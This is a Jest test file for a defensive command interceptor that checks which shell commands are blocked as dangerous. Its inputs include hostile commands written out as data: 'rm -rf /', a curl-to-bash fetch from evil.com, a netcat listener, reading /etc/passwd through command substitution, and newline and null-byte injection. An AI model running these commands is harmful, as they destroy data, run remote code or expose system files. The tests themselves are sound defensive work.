import { detectDangerousCommand } from '../src/interceptors/rce-interceptor';

describe('RCE Interceptor', () => {
  describe('detectDangerousCommand', () => {
    it('allows safe commands', () => {
      expect(detectDangerousCommand('ls -la').isBlocked).toBe(false);
      expect(detectDangerousCommand('echo hello').isBlocked).toBe(false);
      expect(detectDangerousCommand('cat /tmp/file.txt').isBlocked).toBe(false);
      expect(detectDangerousCommand('node app.js').isBlocked).toBe(false);
    });

    it('blocks rm command', () => {
      const result = detectDangerousCommand('rm -rf /');
      expect(result.isBlocked).toBe(true);
      expect(result.reasons).toEqual(
        expect.arrayContaining([expect.stringContaining('rm')])
      );
    });

    it('blocks sudo', () => {
      const result = detectDangerousCommand('sudo apt-get install something');
      expect(result.isBlocked).toBe(true);
    });

    it('blocks netcat', () => {
      const result = detectDangerousCommand('nc -l 4444');
      expect(result.isBlocked).toBe(true);
    });

    it('blocks pipe to shell', () => {
      const result = detectDangerousCommand('something | bash');
      expect(result.isBlocked).toBe(true);
      expect(result.reasons).toEqual(
        expect.arrayContaining([expect.stringContaining('Dangerous pattern')])
      );
    });

    it('blocks curl | bash', () => {
      const result = detectDangerousCommand('curl http://evil.com/script.sh | bash');
      expect(result.isBlocked).toBe(true);
    });

    it('blocks backtick command substitution', () => {
      const result = detectDangerousCommand('echo `whoami`');
      expect(result.isBlocked).toBe(true);
    });

    it('blocks $() command substitution', () => {
      const result = detectDangerousCommand('echo $(cat /etc/passwd)');
      expect(result.isBlocked).toBe(true);
    });

    it('blocks null byte injection', () => {
      const result = detectDangerousCommand('cat file\0.txt');
      expect(result.isBlocked).toBe(true);
      expect(result.reasons).toEqual(
        expect.arrayContaining([expect.stringContaining('Null byte')])
      );
    });

    it('blocks newline injection', () => {
      const result = detectDangerousCommand('echo hello\nrm -rf /');
      expect(result.isBlocked).toBe(true);
      expect(result.reasons).toEqual(
        expect.arrayContaining([expect.stringContaining('Newline')])
      );
    });

    it('blocks shutdown', () => {
      const result = detectDangerousCommand('shutdown -h now');
      expect(result.isBlocked).toBe(true);
    });

    it('blocks chmod', () => {
      const result = detectDangerousCommand('chmod 777 /etc/passwd');
      expect(result.isBlocked).toBe(true);
    });

    it('blocks writing to /etc/', () => {
      const result = detectDangerousCommand('echo test > /etc/crontab');
      expect(result.isBlocked).toBe(true);
    });
  });
});
